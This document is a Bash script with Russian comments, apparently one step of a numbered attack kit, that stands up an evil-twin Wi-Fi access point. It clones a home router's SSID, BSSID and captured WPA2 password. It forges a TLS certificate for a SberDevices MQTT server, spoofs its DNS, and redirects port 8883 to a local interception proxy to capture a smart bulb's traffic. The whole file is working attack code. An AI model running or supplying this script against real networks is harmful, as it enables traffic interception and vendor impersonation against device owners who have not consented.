#!/bin/bash
# поднимает фейковый AP клонируя домашний роутер лампочки
# использование: ./04_evil_twin.sh start | stop

# параметры из наших дампов
SSID="TP-Link_5E56"
BSSID="D8:0D:17:7F:5E:56"
PASSWORD="20272791"
AP_IFACE="wlan1"         # интерфейс для AP (не monitor)
UPSTREAM="eth0"          # откуда брать реальный интернет
FAKE_IP="10.0.13.1"      # IP нашего фейкового роутера
MQTT_SERVER="odm.iot.sberdevices.ru"

mkdir -p logs conf certs

# читаем канал
if [ -f logs/home_channel.txt ]; then
    CHANNEL=$(cat logs/home_channel.txt)
else
    CHANNEL=10
fi

start() {
    # генерируем сертификат для TLS MITM если его нет
    if [ ! -f certs/server.crt ]; then
        echo "[log] генерируем self-signed сертификат с CN=$MQTT_SERVER"
        openssl req -x509 -newkey rsa:2048 -keyout certs/server.key -out certs/server.crt \
            -days 365 -nodes \
            -subj "/CN=$MQTT_SERVER/O=SberDevices/C=RU" 2>/dev/null
    fi

    # если wlan1 удалил airmon-ng — воссоздаём его на том же чипе
    if ! ip link show $AP_IFACE > /dev/null 2>&1; then
        echo "[log] $AP_IFACE не найден, воссоздаём VAP на phy2"
        iw phy phy2 interface add $AP_IFACE type managed
        sleep 1
    fi

    # пишем конфиг hostapd
    cat > conf/hostapd.conf << EOF
interface=$AP_IFACE
ssid=$SSID
bssid=$BSSID
hw_mode=g
channel=$CHANNEL
wpa=2
wpa_passphrase=$PASSWORD
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
ieee80211w=0
EOF
    echo "[log] hostapd.conf: SSID=$SSID CH=$CHANNEL"

    # пишем конфиг dnsmasq
    cat > conf/dnsmasq.conf << EOF
interface=$AP_IFACE
bind-interfaces
dhcp-range=10.0.13.100,10.0.13.150,255.255.255.0,12h
dhcp-option=3,$FAKE_IP
dhcp-option=6,$FAKE_IP
address=/$MQTT_SERVER/$FAKE_IP
server=8.8.8.8
EOF
    echo "[log] dnsmasq.conf: DHCP 10.0.13.100-150, DNS redirect $MQTT_SERVER -> $FAKE_IP"

    # настраиваем IP и маршрутизацию
    echo "[log] настраиваем $AP_IFACE: IP=$FAKE_IP"
    ip addr flush dev $AP_IFACE 2>/dev/null
    ip addr add $FAKE_IP/24 dev $AP_IFACE
    ip link set $AP_IFACE up

    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -F
    iptables -F FORWARD
    iptables -t nat -A POSTROUTING -o $UPSTREAM -j MASQUERADE
    iptables -A FORWARD -i $AP_IFACE -o $UPSTREAM -j ACCEPT
    iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
    # перехватываем MQTT (8883) и отправляем на наш прокси (18883)
    iptables -t nat -A PREROUTING -i $AP_IFACE -p tcp --dport 8883 -j REDIRECT --to-port 18883
    echo "[log] iptables: порт 8883 -> 18883 (MQTT прокси)"

    # запускаем hostapd
    hostapd conf/hostapd.conf >> logs/hostapd.log 2>&1 &
    echo $! > logs/hostapd.pid
    sleep 2
    echo "[log] hostapd запущен (PID $(cat logs/hostapd.pid))"

    # ставим IP заново (hostapd мог сбросить)
    ip addr add $FAKE_IP/24 dev $AP_IFACE 2>/dev/null

    # запускаем dnsmasq
    dnsmasq -C conf/dnsmasq.conf --pid-file=logs/dnsmasq.pid 2>&1
    echo "[log] dnsmasq запущен"

    # запускаем MQTT прокси
    python3 05_mqtt_proxy.py >> logs/mqtt_proxy.log 2>&1 &
    echo $! > logs/proxy.pid
    echo "[log] MQTT прокси запущен на порту 18883 (PID $(cat logs/proxy.pid))"

    echo ""
    echo "[log] Evil Twin активен. Теперь запускай 03_deauth.sh"
    echo "[log] следи за logs/hostapd.log и logs/mqtt_proxy.log"
}

stop() {
    echo "[log] останавливаем всё"
    [ -f logs/proxy.pid ]   && kill $(cat logs/proxy.pid)   2>/dev/null
    [ -f logs/hostapd.pid ] && kill $(cat logs/hostapd.pid) 2>/dev/null
    [ -f logs/dnsmasq.pid ] && kill $(cat logs/dnsmasq.pid) 2>/dev/null
    pkill hostapd 2>/dev/null

    iptables -t nat -F
    iptables -F FORWARD
    echo 0 > /proc/sys/net/ipv4/ip_forward

    ip link set $AP_IFACE down 2>/dev/null
    iw dev $AP_IFACE del 2>/dev/null

    echo "[log] готово"
}

case "$1" in
    start) start ;;
    stop)  stop  ;;
    *)     echo "использование: $0 start | stop" ;;
esac
